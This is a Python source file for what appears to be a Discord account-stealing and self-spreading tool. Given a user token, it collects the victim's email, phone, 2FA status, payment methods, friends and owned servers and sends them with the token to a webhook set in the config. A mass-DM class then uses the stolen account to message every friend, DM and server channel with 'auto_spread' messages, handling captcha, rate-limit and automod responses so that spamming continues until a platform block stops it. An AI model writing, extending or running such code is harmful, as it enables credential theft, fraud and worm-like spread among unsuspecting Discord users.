from discord_webhook import AsyncDiscordWebhook, DiscordEmbed
import config
import asyncio
from colorama import Fore
from datetime import datetime
import aiohttp
import random
import os

async def get_headers(token, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
    }
    if token:
        headers.update({"Authorization": token})
    return headers

async def get_details(token):
    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me", headers=await get_headers(token)) as resp:
        data = await resp.json()
        if not data['phone']:
            data['phone'] = False
        return data
            
async def get_relationships(token):
    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/relationships", headers=await get_headers(token)) as resp:
        data = await resp.json()
        return len(data)

async def get_guilds(token):
    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true", headers=await get_headers(token)) as resp:
        return await resp.json()
    
async def get_payment(token):
    async with aiohttp.request("GET", "https://discordapp.com/api/users/@me/billing/payment-sources", headers=await get_headers(token)) as resp:
        data = await resp.json()
        if data:
            for pm in data:
                if 'invalid' in pm: #if there is invalid a pm exists
                    if pm['invalid'] == False: 
                        return True
        return False


async def capture_owned_guilds(guilds):
    owned_guilds = []
    for guild in guilds:
        if guild["owner"]:
            owned_guilds.append(guild)
    return owned_guilds

async def generate_embed(token, logged_from):
    details = await get_details(token)

    if "premium_type" in details:
        if details['premium_type'] == 1:
            nitro = "Classic"
        elif details['premium_type'] == 2:
            nitro = True
    else:
        nitro = False
        
        
    guilds = await get_guilds(token)

    owned_guilds = await capture_owned_guilds(guilds)
    
    embed = DiscordEmbed()



    embed.set_author(name=f"{details['username']}#{details['discriminator']}:{details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{details['id']}/{details['avatar']}.webp?size=128")
    embed.add_embed_field(name='Token',         value=token, inline=False)
    embed.add_embed_field(name='Email',         value=details['email'], inline=False)
    embed.add_embed_field(name='Phone',         value=details['phone'], inline=False)
    embed.add_embed_field(name='2FA',           value=details["mfa_enabled"])
    embed.add_embed_field(name='Nitro',         value=nitro)
    embed.add_embed_field(name='Billing',       value=await get_payment(token))
    embed.add_embed_field(name='Relationships', value=await get_relationships(token))
    embed.add_embed_field(name='Guilds',        value=len(guilds))
    embed.add_embed_field(name='Owned Guilds',  value=len(owned_guilds))

    embed.set_footer(text=f"screen: [{config.screensess}] server: [{logged_from}]")
    for owned in owned_guilds:
        embed.add_embed_field(name=owned['name'], value=f"{owned['approximate_member_count']} Members", inline=False)
    return embed


async def send_webhook(token, logged_from):
    webhook = AsyncDiscordWebhook(url=config.config["webhook_url"])
    
    webhook.add_embed(await generate_embed(token, logged_from))
    try:
        await webhook.execute()
    except Exception:
        print('Failed to send webhook')

async def send_friend_request(token, user):
    payload = {
        "username": user[0],
        "discriminator": user[1]
    }
    async with aiohttp.request("POST", "https://discord.com/api/v9/users/@me/relationships", json=payload, headers=await get_headers(token)) as resp:
        pass


    
async def get_guilds(self):
    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds", headers=self.headers) as resp:
        return await resp.json()

async def get_guild_channels(self, guild_id):
    async with aiohttp.request("GET", f"https://discordapp.com/api/guilds/{guild_id}/channels", headers=self.headers) as resp:
        return await resp.json()


async def get_dms(self):
    async with aiohttp.request("GET", f"https://discord.com/api/v8/users/@me/channels", headers=self.headers) as resp:
        return await resp.json()


async def get_relationships(self):
    async with aiohttp.request("GET", f"https://discordapp.com/api/v6/users/@me/relationships", headers=self.headers) as resp:
        return await resp.json()
    
async def update_status(self, message):
    payload = {
        "bio": message
    }       
    async with aiohttp.request("PATCH", f"https://discord.com/api/v9/users/@me", json=payload, headers=self.headers) as resp:
        return await resp.json()

class MassDM:
    async def init(self, token, name):
        self.token = token
        self.headers = await self.get_headers(token)
        self.name = name #for printing
        self.msg_index = 0

    
 


    
    async def message_channel(self, channel_id, message=None):
        #this is the worst function i have ever written in my entire life
        for _ in range(5):

            if not message:
                message = config.config["auto_spread"]["messages"][self.msg_index]
            payload = {
                "content": message
            }
            async with aiohttp.request("POST", f"https://discordapp.com/api/channels/{channel_id}/messages", json=payload, headers=self.headers) as resp:
                data = await resp.json()
                if resp.status == 401: #
                    break
            
                if resp.status == 403:
                    break

                if 'You need to verify your account in order to perform this action.' in data:
                    return 'locked'

                if 'captcha_key' in data:
                    return "captcha"

                if 'retry_after' in data:
                    if data['retry_after']/1000 > 10:
                        return "rate_limit"
                    await asyncio.sleep(data['retry_after']/1000)

                if 'Message was blocked by automatic moderation' in data:
                    return 'moderation'
                if 'code' in data:
                    if data['code'] == 50007:
                        break
                
                if 'Missing Access' in data:
                    break
                
                if 'id' in data:
                    break
            
            self.msg_index = self.msg_index + 1
            if self.msg_index == len(config.config["auto_spread"]["messages"]):
                self.msg_index = 0
                


    async def open_dm(self, recipient):
        payload = {"recipients": [recipient]} #[] because its an array just only 1 element, this endpoint designed to support multiple people
        async with aiohttp.request("POST", f"https://discord.com/api/users/@me/channels", headers=self.headers, json=payload) as resp:
            data = await resp.json()
            return data['id']
    
    async def close_dm(self, dm_id):
        async with aiohttp.request("DELETE", f"https://discord.com/api/v8/channels/{dm_id}", headers=self.headers):
            return

    async def message_friends(self):
        for relationship in await self.get_relationships():
            if not 'type' in relationship: #check if any relationships
                return

            if relationship['type'] == 1:
                dm_id = await self.open_dm(relationship['id'])
                resp = await self.message_channel(dm_id)
                if resp == "captcha":
                    return
                if resp == "rate_limit":
                    return
                if resp == "locked":
                    return
                if resp == "moderation":
                    return
                await self.close_dm(dm_id)
                print(f'{Fore.BLUE}[MassDM] [USER:{self.name}] [FRIEND:{relationship["user"]["username"]}#{relationship["user"]["discriminator"]}]')


    
    async def message_dms(self):
        for dm in await self.get_dms():
            if not 'id' in dm: # check if any dms
                return

            resp = await self.message_channel(dm['id'])
            if resp == "captcha":
                return
            if resp == "rate_limit":
                return
            if resp == "locked":
                return
            if resp == "moderation":
                return
            await self.close_dm(dm['id'])
            print(f'{Fore.BLUE}[MassDM] [USER:{self.name}] [DM:{len(dm["recipients"])}]')



    async def message_guilds(self):

        for guild in await self.get_guilds():
            if not 'id' in guild: #check if any guilds
                return
            if guild['id'] in config.config['servers']:
                continue
            # self.update_status(random.choice(config.config["auto_spread"]["messages"]))

            for channel in await self.get_guild_channels(guild['id']):
                if not 'type' in channel: #check if any channels
                    return

                if channel['type'] == 0:
                    resp = await self.message_channel(channel['id'])
                    if resp == "captcha":
                        return
                    if resp == "rate_limit":
                        return
                    if resp == "locked":
                        return
                    if resp == "moderation":
                        return
                    print(f'{Fore.BLUE}[MassDM] [USER:{self.name}] [GUILD:{guild["name"]}] [CHANNEL:{channel["name"]}]')

    

        